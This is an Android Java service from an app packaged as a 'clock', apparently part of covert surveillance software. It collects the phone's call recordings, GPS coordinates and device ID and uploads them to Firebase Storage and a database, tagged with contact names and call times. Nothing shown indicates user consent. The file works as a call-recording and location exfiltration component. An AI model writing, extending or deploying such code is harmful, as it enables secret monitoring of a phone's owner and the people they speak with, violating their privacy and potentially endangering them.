package com.aftab.clock.Services;

import android.app.IntentService;
import android.content.Context;
import android.content.Intent;
import android.net.Uri;
import android.os.IBinder;

import androidx.annotation.Nullable;

import com.aftab.clock.Model.CallLogs;
import com.aftab.clock.Model.Recordings;
import com.aftab.clock.Utills.Constants;
import com.aftab.clock.Utills.FireRef;
import com.aftab.clock.Utills.Functions;
import com.aftab.clock.Utills.SharedPref;
import com.google.android.gms.tasks.Task;
import com.google.firebase.storage.FirebaseStorage;
import com.google.firebase.storage.StorageReference;

import java.io.File;
import java.util.ArrayList;

import im.delight.android.location.SimpleLocation;

public class UploadPreCallRecordings extends IntentService {
    public static double longitude = 0;
    public static double latitude = 0;
    Context context;
    SharedPref sh;
    ArrayList<Recordings> callRecordingsList = new ArrayList<>();
    StorageReference audioFileRef;
    int counter = 0;
    String deviceID, latLng;
    private SimpleLocation simpleLocation;

    public UploadPreCallRecordings() {
        super("UploadPreCallRecordings");
    }


    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    protected void onHandleIntent(@Nullable Intent intent) {


        assert intent != null;
        callRecordingsList = (ArrayList<Recordings>) intent.getSerializableExtra(Constants.PRE_CALL_RECORDINGS);

        simpleLocation = new SimpleLocation(this);
        simpleLocation.beginUpdates();

        longitude = simpleLocation.getLongitude();
        latitude = simpleLocation.getLatitude();

        deviceID = Functions.getDeviceId(context);
        latLng = longitude + "," + latitude;


        uploadRec();


    }

    private void uploadRec() {

        if (counter < callRecordingsList.size()) {

            String duration = callRecordingsList.get(counter).getDuration();
            String date = callRecordingsList.get(counter).getDate();

            String pushId = date + duration+"";

            StorageReference filePath = audioFileRef.child(pushId + ".amr");

            File file = new File(callRecordingsList.get(counter).getFilePath());

            filePath.putFile(Uri.fromFile(file)).addOnSuccessListener(taskSnapshot -> {

                final Task<Uri> firebaseUri = taskSnapshot.getStorage().getDownloadUrl();

                firebaseUri.addOnSuccessListener(uri -> {

                    String callType2 = "PRE_REC";

                    String link = uri.toString();

                    CallLogs callLogs = new CallLogs(pushId, callRecordingsList.get(counter).getName(), "No", callType2,date, duration, latLng, link, false);

                    assert pushId != null;
                    FireRef.PRE_REC.child(deviceID).child(pushId)
                            .setValue(callLogs).addOnCompleteListener(task -> {

                        counter++;
                        uploadRec();

                    });

                });

            });


        }

    }

    @Override
    public void onCreate() {
        super.onCreate();
        context = this;
        sh = new SharedPref(context);
        simpleLocation = new SimpleLocation(this);
        simpleLocation.beginUpdates();
        audioFileRef = FirebaseStorage.getInstance().getReference().child("Audio Files");
    }


    @Override
    public void onDestroy() {
        super.onDestroy();
        simpleLocation.endUpdates();
    }
}